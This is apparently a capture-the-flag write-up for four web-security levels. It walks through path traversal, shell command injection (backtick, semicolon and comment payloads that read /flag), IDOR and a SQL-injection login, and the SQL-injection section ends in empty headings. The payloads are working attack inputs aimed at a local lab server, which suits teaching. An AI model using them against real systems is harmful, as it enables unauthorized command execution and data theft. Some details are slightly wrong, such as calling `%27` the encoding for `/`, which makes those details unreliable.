---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 9
---

## level 1

> Exploit a path traversal vulnerability

```py title="level 1 source code"
def level1():
    path = request.args.get("path")
    assert path, "Missing `path` argument"
    return (pathlib.Path(app.root_path) / path).read_text()
```

As we can see from the source code, the server takes the `path` parameter from the request arguments and then returns the result.

So we can just send a request with the `path` parameter set to `/flag`.

```
hacker@web-security~level1:/$ curl 'http://challenge.localhost/?path=/flag'
```

&nbsp;

## level 2

> Exploit a command injection vulnerability

```py title="level 2 source code"
def level2():
    timezone = request.args.get("timezone", "UTC")
    return subprocess.check_output(f"TZ={timezone} date", shell=True, encoding="latin")
```

As we can see, the server takes the value given to the `timezone` parameter.

It then inserts the argument in the shell command to retrieve the date.

```
## Resultant command
TZ={timezone} date
```

From the above command, the shell set the environment variable `TZ` to our provided value and then executes the `date` command in that context.

We can provide `UTC` as the value and see what output it provides.

```
## Request
http://challenge.localhost/?timezone=UTC

## Resultant Command
TZ=UTC date
```

![image](https://github.com/Kunull/Write-ups/assets/110326359/73567980-d93d-452c-af32-4b401ba92097)

Now let's try the same with `MST` as the value.

```
## Request
http://challenge.localhost/?timezone=UTC

## Resultant Command
TZ=MST date
```

![image](https://github.com/Kunull/Write-ups/assets/110326359/4baabe84-7bd9-4b78-95d5-a407b95b658e)

As we can see in the third command of both examples and the `Result`, the `date` command is influenced by the value of the `TZ` variable, which we control.

### Command Injection

#### Backticks 

If we provide the `whoami` command with backticks, the shell executes the command within the backticks and substitutes it's result in the 

```
## Request
http://challenge.localhost/?timezone=`whoami`

## Resultant Command
TZ=`whoami` date
```

![image](https://github.com/Kunull/Write-ups/assets/110326359/e8bd69b6-6261-4df3-b7a5-4013c3a4e550)

Once it has the result for the `whoami` command, the shell will substitute the result in the `TZ` variable.

```
## Resultant Command
TZ=root date
```

![image](https://github.com/Kunull/Write-ups/assets/110326359/5558b05c-23df-461d-9b37-9c5c92449089)

```
hacker@web-security~level2:/$ curl 'http://challenge.localhost/?timezone=`whoami`'
Wed Jun  5 04:12:07 root 2024
```

#### Semicolon `;`

If we use the semicolon `;` character, it ends the current shell statement and begins a new shell statement.

```
## Request
http://challenge.localhost/?timezone=;whoami;

## Resultant Command
TZ=;
root;
date
```

While sending the request, we have to URI encode the `;` character with `%3B`.

```
hacker@web-security~level2:/$ curl 'http://challenge.localhost/?timezone=%3Bwhoami%3B'
root
Wed Jun  5 04:20:22 UTC 2024
```

#### Hash `#`

If we use the hash `#` character, it comments out everything that comes afterwards.

```
## Request
http://challenge.localhost/?timezone=;whoami;#

## Resultant Command
TZ=;
root;
#date    ## The date command is commented out
```

While sending the request, we have to URI encode the `#` character with `%23`.

```
hacker@web-security~level2:/$ curl 'http://challenge.localhost/?timezone=%3Bwhoami%3B%23'
root
```

Now, we can use all of these concepts to `cat` out the `/flag` file.

```
## Request
http://challenge.localhost/?timezone=;cat /flag;#

## Resultant Command
TZ=;
cat /flag;
#date    ## The date command is commented out
```

While sending the request, we have to URI encode the ` ` character with `%20`  and the `/` character with `%27`.

```
hacker@web-security~level2:/$ curl 'http://challenge.localhost/?timezone=%3Bcat%20%2Fflag%3B%23'
```

&nbsp;

## level 3

> Exploit an authentication bypass vulnerability

```py title="level 3 source code"
def level3():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
        assert user, "Invalid `username` or `password`"

        return redirect(request.path, user=int(user["rowid"]))

    if "user" in request.args:
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```

Using POST method to make the request will acticvate the first conditional which we do not want.
We only want to retrieve the flag wihout having to authenticate.

### Insecure Direct Object Reference (IDOR)

IDOR allows attackers to reference data which they otherwise shouldn't be able to.

The user retrieveal part of the code is what we are going to exploit.

```py
if "user" in request.args:
    user_id = int(request.args["user"])
    user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
    if user:
        username = user["username"]
        if username == "flag":
            return f"{flag}\n"
        return f"Hello, {username}!\n"
```

If the `user` parameter is in the request arguments, the code fetches the user by `rowid` and displays a message. If the username is `lag`, it returns the flag.

```
hacker@web-security~level3:/$ curl 'http://challenge.localhost/?user=1'
```

&nbsp;

## level 4

> Exploit a structured query language injection vulnerability to login

```py title="level 4 source code"
def level4():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone()
        assert user, "Invalid `username` or `password`"

        session["user"] = int(user["rowid"])
        return redirect(request.path)

    if session.get("user"):
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```

### SQL Injection
#### Login bypass by commnenting out password check

#### Login bypass by breacking password check
